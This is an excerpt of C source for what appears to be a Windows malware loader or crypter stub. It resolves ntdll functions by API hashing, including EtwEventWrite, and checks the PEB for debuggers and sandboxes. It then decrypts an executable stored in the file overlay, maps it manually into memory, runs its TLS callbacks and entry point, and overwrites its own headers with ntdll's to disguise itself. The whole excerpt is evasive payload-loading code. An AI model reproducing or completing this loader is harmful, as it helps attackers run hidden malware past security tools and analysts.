...
DEC_FUNC FARPROC GetFuncAddr(HMODULE hmd, const IMAGE_DATA_DIRECTORY *exdr, DWORD fhs) {
    ...
    for (;  addr < ade;  addr++, ordd++) {
        LPCSTR cur = (LPCSTR)((PBYTE)hmd + *addr);
        if (HashStr(cur) != fhs) continue;
         

        DWORD frv = *(func + *ordd);
        return (
            (frv >= exdr->VirtualAddress) && 
            (frv < (exdr->VirtualAddress + exdr->Size))
        )? NULL : (FARPROC)((PBYTE)hmd + frv); 
    }
...
DEC_FUNC BOOL InitPEBApi(HMODULE *phNt, const MN_PEB *peb) {
    *phNt      = GetLibAddr(peb);
    ...
    pNtEtwEventWrite           = (PVOID                      )GetFuncAddr(hd, exdr, HASH_EtwEventWrite            );
    pNtAllocateVirtualMemory   = (NtAllocateVirtualMemory_t  )GetFuncAddr(hd, exdr, HASH_NtAllocateVirtualMemory  );
    pNtFreeVirtualMemory       = (NtFreeVirtualMemory_t      )GetFuncAddr(hd, exdr, HASH_NtFreeVirtualMemory      );
    pNtProtectVirtualMemory    = (NtProtectVirtualMemory_t   )GetFuncAddr(hd, exdr, HASH_NtProtectVirtualMemory   );
    pLdrLoadDll                = (LdrLoadDll_t               )GetFuncAddr(hd, exdr, HASH_LdrLoadDll               );
    pLdrGetProcedureAddress    = (LdrGetProcedureAddress_t   )GetFuncAddr(hd, exdr, HASH_LdrGetProcedureAddress   );
    pRtlAddFunctionTable       = (RtlAddFunctionTable_t      )GetFuncAddr(hd, exdr, HASH_RtlAddFunctionTable      );
    pNtQueryInformationProcess = (NtQueryInformationProcess_t)GetFuncAddr(hd, exdr, HASH_NtQueryInformationProcess);
    pNtSetInformationProcess   = (NtSetInformationProcess_t  )GetFuncAddr(hd, exdr, HASH_NtSetInformationProcess  );
    pNtSetInformationThread    = (NtSetInformationThread_t   )GetFuncAddr(hd, exdr, HASH_NtSetInformationThread   );
    pNtOpenFile                = (NtOpenFile_t               )GetFuncAddr(hd, exdr, HASH_NtOpenFile               );
    pNtReadFile                = (NtReadFile_t               )GetFuncAddr(hd, exdr, HASH_NtReadFile               );
    pNtClose                   = (NtClose_t                  )GetFuncAddr(hd, exdr, HASH_NtClose                  );
    pNtQueryInformationFile    = (NtQueryInformationFile_t   )GetFuncAddr(hd, exdr, HASH_NtQueryInformationFile   );
    pNtTerminateProcess        = (NtTerminateProcess_t       )GetFuncAddr(hd, exdr, HASH_NtTerminateProcess       );


    return pNtEtwEventWrite           &&
...
DEC_FUNC HMODULE LoadLib(LPCWSTR nm) {
    UNICODE_STRING s;
    INIT_USTR(&s, nm);
    HANDLE hd = NULL;
...
DEC_FUNC VOID ProtectImage(PVOID img, const IMAGE_NT_HEADERS *nthd) {
    ...
    for (;  sh < se;  sh++) {
        ...
        ULONG  prt = PAGE_NOACCESS,  
               olp;


        BOOL r = !!(sh->Characteristics & IMAGE_SCN_MEM_READ   ),
             w = !!(sh->Characteristics & IMAGE_SCN_MEM_WRITE  ),
             x = !!(sh->Characteristics & IMAGE_SCN_MEM_EXECUTE);


        if (x) prt = w? PAGE_EXECUTE_READWRITE : (r? PAGE_EXECUTE_READ : PAGE_EXECUTE );
        else   prt = w? PAGE_READWRITE         : (r? PAGE_READONLY     : PAGE_NOACCESS);

        pNtProtectVirtualMemory(CUR_PROC, &adr, &vsz, prt, &olp);
    }
...
DEC_FUNC PBYTE ReadOverlay(VOID) {
    ...
    BYTE  pBuf[ (MAX_PATH * sizeof(WCHAR)) + sizeof(UNICODE_STRING) ];
    ULONG pBln;

    if (pNtQueryInformationProcess(
        CUR_PROC, ProcessImageFileName, 
        pBuf, sizeof(pBuf), &pBln
    )) return NULL;

    fPath = (PUNICODE_STRING)pBuf;
...
{//*
    ...
    if (peb->NumberOfProcessors < 2) return STATUS_INSUFFICIENT_RESOURCES;
    if (peb->BeingDebugged         ) return STATUS_ACCESS_VIOLATION;
    if (peb->NtGlobalFlag & 0x70   ) return STATUS_ACCESS_VIOLATION;
...
// [UINT32=total_len:4|BYTE=key_size:1|LPCBYTE=key:key_size|UINT32=raw_len:4|LPCBYTE=encrypted_exe]
    ...
    const UINT32 PE_EXE_SZ = *(const UINT32*)(PE_DAT + 4 + 1 + PE_KEY_SZ),
    ...
    PVOID   buf = NULL;
    {SIZE_T bsz = (SIZE_T)((PE_EXE_SZ > DT_EXE_SZ)? 
                            PE_EXE_SZ : DT_EXE_SZ);
    ...
    UnPack(
        ...
        PE_EXE, 
        DT_EXE_SZ, 
        (PE_EXE_SZ > DT_EXE_SZ)? PE_EXE_SZ : DT_EXE_SZ,
        PE_KEY,
        PE_KEY_SZ - 1
    ...
    PVOID   img = NULL;
    {SIZE_T isz = (SIZE_T)ALIGN_PAGE((
        (PE_EXE_SZ > nthd->OptionalHeader.SizeOfImage)? 
         PE_EXE_SZ : nthd->OptionalHeader.SizeOfImage
    ) + PAGE_SIZE);
    ...
    for (;  sn < se;  sn++) {
        ...
        DWORD oe = sn->PointerToRawData + sn->SizeOfRawData;
        if (oe > mOf) mOf = oe;
    }


    if (PE_EXE_SZ > mOf) {
        LPVOID dst = (LPVOID)((PBYTE)img + mOf),
               src = (LPVOID)((PBYTE)buf + mOf);
        DWORD  sz  = PE_EXE_SZ           - mOf ;
    ...
    if (edr->Size) pRtlAddFunctionTable(
    ...
    if (lcd->Size) {
        ...
        if (lc->SecurityCookie) 
            *(PULONG_PTR)lc->SecurityCookie = 
                (ULONG_PTR)img 
            ^ 
                *(volatile ULONG_PTR*)KUSER_INTERRUPT_TIME_VA;
    }}
    ...
    AddrEntry = (ULONG_PTR)img + nthd->OptionalHeader.AddressOfEntryPoint;
    ExecTLS(img, nthd);


    
    {SIZE_T asz = PAGE_SIZE; 
    ULONG   op;

    if (!pNtProtectVirtualMemory(CUR_PROC, &iba, &asz, PAGE_READWRITE, &op)) {
        DWORD ioz = ( 
            (PIMAGE_NT_HEADERS)((PBYTE)iba + 
            ((PIMAGE_DOS_HEADER)iba)->e_lfanew) 
        )->OptionalHeader.SizeOfImage;


        PIMAGE_NT_HEADERS ntd = (PIMAGE_NT_HEADERS)((PBYTE)hNt + 
                                ((PIMAGE_DOS_HEADER)hNt)->e_lfanew);
        MEMCPY(iba, hNt, (ntd->OptionalHeader.SizeOfHeaders < asz)? 
                          ntd->OptionalHeader.SizeOfHeaders : asz);
        

        PIMAGE_NT_HEADERS ntn = (PIMAGE_NT_HEADERS)((PBYTE)iba + 
                                ((PIMAGE_DOS_HEADER)iba)->e_lfanew);
        ...
        pNtProtectVirtualMemory(CUR_PROC, &iba, &asz, PAGE_READONLY, &op);
    }
    FreeBuf(buf, PE_EXE_SZ);}
